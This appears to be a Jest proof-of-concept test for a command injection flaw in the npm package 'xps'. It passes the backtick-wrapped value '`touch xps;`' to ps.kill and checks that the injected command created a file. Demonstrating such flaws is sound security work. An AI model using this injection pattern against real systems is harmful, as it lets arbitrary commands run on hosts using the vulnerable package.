test("Command Injection in xps", (done) => {
  expect.assertions(2);
  const ps = require("xps");
  const fs = require("fs");
  const path = "./xps";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps.kill("`touch xps;`").fork(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
